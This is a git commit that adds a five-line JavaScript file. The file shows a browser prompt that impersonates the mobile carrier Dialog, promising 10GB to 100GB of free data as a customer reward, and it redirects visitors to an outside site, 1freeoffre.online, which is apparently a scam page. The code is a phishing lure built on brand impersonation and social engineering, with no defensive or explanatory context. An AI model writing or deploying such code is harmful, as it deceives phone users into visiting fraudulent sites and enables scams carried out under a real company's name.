4f14a4df913df653088a88ac67df5c77ee3f4eda
oynxa <heartflet247@gmail.com>
2026-02-04 12:19:36 -0800

    Create activation-indepen.js

---
+++ activation-indepen.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('DIALOG SMS: Dear Customer, Kindly Check If your Dialog Sim Card Is Qualify To Receive From 10GB To 100GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://1freeoffre.online/independence.org.html';
+}
